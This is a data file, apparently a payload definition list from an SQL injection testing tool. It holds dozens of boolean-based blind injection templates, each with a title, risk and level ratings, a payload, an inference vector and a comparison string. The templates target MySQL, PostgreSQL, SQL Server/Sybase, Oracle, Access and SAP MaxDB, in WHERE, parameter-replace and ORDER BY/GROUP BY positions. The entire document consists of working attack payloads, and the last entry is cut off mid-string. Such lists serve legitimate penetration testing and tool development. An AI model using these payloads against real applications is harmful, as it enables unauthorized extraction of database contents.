[{'risk': 1, 'title': 'AND boolean-based blind - WHERE or HAVING clause', 'clause': [1], 'level': 1, 'request': {'payload': 'AND [RANDNUM]=[RANDNUM]'}, 'vector': 'AND [INFERENCE]', 'where': [1], 'response': {'comparison': 'AND [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 3, 'title': 'OR boolean-based blind - WHERE or HAVING clause', 'clause': [1], 'level': 1, 'request': {'payload': 'OR [RANDNUM]=[RANDNUM]'}, 'vector': 'OR [INFERENCE]', 'where': [2], 'response': {'comparison': 'OR [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 1, 'title': 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)', 'clause': [1], 'level': 2, 'request': {'comment': '-- -', 'payload': 'AND [RANDNUM]=[RANDNUM]'}, 'vector': 'AND [INFERENCE]', 'where': [1], 'response': {'comparison': 'AND [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 3, 'title': 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)', 'clause': [1], 'level': 2, 'request': {'comment': '-- -', 'payload': 'OR [RANDNUM]=[RANDNUM]'}, 'vector': 'OR [INFERENCE]', 'where': [2], 'response': {'comparison': 'OR [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 1, 'title': 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)', 'clause': [1], 'level': 3, 'request': {'comment': '#', 'payload': 'AND [RANDNUM]=[RANDNUM]'}, 'vector': 'AND [INFERENCE]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'comparison': 'AND [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 3, 'title': 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)', 'clause': [1], 'level': 3, 'request': {'comment': '#', 'payload': 'OR [RANDNUM]=[RANDNUM]'}, 'vector': 'OR [INFERENCE]', 'details': {'dbms': 'MySQL'}, 'where': [2], 'response': {'comparison': 'OR [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 1, 'title': 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)', 'clause': [1], 'level': 3, 'request': {'comment': '%16', 'payload': 'AND [RANDNUM]=[RANDNUM]'}, 'vector': 'AND [INFERENCE]', 'details': {'dbms': 'Microsoft Access'}, 'where': [1], 'response': {'comparison': 'AND [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 3, 'title': 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)', 'clause': [1], 'level': 3, 'request': {'comment': '%16', 'payload': 'OR [RANDNUM]=[RANDNUM]'}, 'vector': 'OR [INFERENCE]', 'details': {'dbms': 'Microsoft Access'}, 'where': [2], 'response': {'comparison': 'OR [RANDNUM]=[RANDNUM1]'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': 'RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))'}, 'vector': 'RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'comparison': 'RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': 'AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])'}, 'vector': 'AND MAKE_SET([INFERENCE],[RANDNUM])', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'comparison': 'AND MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])'}, 'stype': 1}, {'risk': 3, 'title': 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': 'OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])'}, 'vector': 'OR MAKE_SET([INFERENCE],[RANDNUM])', 'details': {'dbms': 'MySQL'}, 'where': [2], 'response': {'comparison': 'OR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': 'AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])'}, 'vector': 'AND ELT([INFERENCE],[RANDNUM])', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'comparison': 'AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])'}, 'stype': 1}, {'risk': 3, 'title': 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': 'OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])'}, 'vector': 'OR ELT([INFERENCE],[RANDNUM])', 'details': {'dbms': 'MySQL'}, 'where': [2], 'response': {'comparison': 'OR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]'}, 'vector': 'AND ([INFERENCE])*[RANDNUM]', 'details': {'dbms': 'MySQL'}, 'where': [1], 'response': {'comparison': 'AND ([RANDNUM]=[RANDNUM1])*[RANDNUM1]'}, 'stype': 1}, {'risk': 3, 'title': 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]'}, 'vector': 'OR ([INFERENCE])*[RANDNUM]', 'details': {'dbms': 'MySQL'}, 'where': [2], 'response': {'comparison': 'OR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL >= 5.0 boolean-based blind - Parameter replace', 'clause': [1, 2, 3], 'level': 1, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL < 5.0 boolean-based blind - Parameter replace', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '< 5.0'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '< 5.0'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL boolean-based blind - Parameter replace (MAKE_SET)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': 'MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])'}, 'vector': 'MAKE_SET([INFERENCE],[RANDNUM])', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'comparison': 'MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])'}, 'vector': 'MAKE_SET([INFERENCE],[ORIGVALUE])', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'comparison': 'MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL boolean-based blind - Parameter replace (ELT)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': 'ELT([RANDNUM]=[RANDNUM],[RANDNUM1])'}, 'vector': 'ELT([INFERENCE],[RANDNUM])', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'comparison': 'ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL boolean-based blind - Parameter replace (ELT - original value)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])'}, 'vector': 'ELT([INFERENCE],[ORIGVALUE])', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'comparison': 'ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL boolean-based blind - Parameter replace (bool*int)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': '([RANDNUM]=[RANDNUM])*[RANDNUM1]'}, 'vector': '([INFERENCE])*[RANDNUM]', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'comparison': '([RANDNUM]=[RANDNUM1])*[RANDNUM1]'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL boolean-based blind - Parameter replace (bool*int - original value)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': '([RANDNUM]=[RANDNUM])*[ORIGVALUE]'}, 'vector': '([INFERENCE])*[ORIGVALUE]', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'comparison': '([RANDNUM]=[RANDNUM1])*[ORIGVALUE]'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - Parameter replace', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))', 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - Parameter replace (original value)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))', 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': '(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)'}, 'vector': '(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)', 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'comparison': '(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': '(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)'}, 'vector': '(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)', 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'comparison': '(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)', 'clause': [1, 3], 'level': 4, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'stype': 1}, {'risk': 1, 'title': 'Oracle boolean-based blind - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)', 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'stype': 1}, {'risk': 1, 'title': 'Oracle boolean-based blind - Parameter replace (original value)', 'clause': [1, 3], 'level': 4, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)', 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'comparison': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft Access boolean-based blind - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': 'IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)'}, 'vector': 'IIF([INFERENCE],[RANDNUM],1/0)', 'details': {'dbms': 'Microsoft Access'}, 'where': [3], 'response': {'comparison': 'IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft Access boolean-based blind - Parameter replace (original value)', 'clause': [1, 3], 'level': 4, 'request': {'payload': 'IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)'}, 'vector': 'IIF([INFERENCE],[ORIGVALUE],1/0)', 'details': {'dbms': 'Microsoft Access'}, 'where': [3], 'response': {'comparison': 'IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)'}, 'stype': 1}, {'risk': 1, 'title': 'SAP MaxDB boolean-based blind - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': '(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)'}, 'vector': '(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [3], 'response': {'comparison': '(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)'}, 'stype': 1}, {'risk': 1, 'title': 'SAP MaxDB boolean-based blind - Parameter replace (original value)', 'clause': [1, 3], 'level': 4, 'request': {'payload': '(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)'}, 'vector': '(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [3], 'response': {'comparison': '(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 2, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)', 'clause': [2, 3], 'level': 3, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '< 5.0'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'stype': 1}, {'risk': 1, 'title': 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '< 5.0'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 2, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - ORDER BY clause (original value)', 'clause': [3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))'}, 'stype': 1}, {'risk': 1, 'title': 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)', 'clause': [3], 'level': 5, 'request': {'payload': ',(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)'}, 'vector': ',(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)', 'details': {'dbms': 'PostgreSQL'}, 'where': [1], 'response': {'comparison': ',(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause', 'clause': [3], 'level': 3, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)', 'clause': [3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))'}, 'stype': 1}, {'risk': 1, 'title': 'Oracle boolean-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'stype': 1}, {'risk': 1, 'title': 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'vector': ',(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)', 'details': {'dbms': 'Oracle'}, 'where': [1], 'response': {'comparison': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',IIF([RANDNUM]=[RANDNUM],1,1/0)'}, 'vector': ',IIF([INFERENCE],1,1/0)', 'details': {'dbms': 'Microsoft Access'}, 'where': [1], 'response': {'comparison': ',IIF([RANDNUM]=[RANDNUM1],1,1/0)'}, 'stype': 1}, {'risk': 1, 'title': 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)', 'clause': [2, 3], 'level': 5, 'request': {'payload': ',IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)'}, 'vector': ',IIF([INFERENCE],[ORIGVALUE],1/0)', 'details': {'dbms': 'Microsoft Access'}, 'where': [1], 'response': {'comparison': ',IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)'}, 'stype': 1}, {'risk': 1, 'title': 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 4, 'request': {'payload': ',(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)'}, 'vector': ',(CASE WHEN [INFERENCE] THEN 1 ELSE NULL END)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'comparison': ',(CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END)'}, 'stype': 1}, {'risk': 1, 'title': 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)', 'clause': [2, 3], 'level': 5, 'request': {'payload': ',(CASE 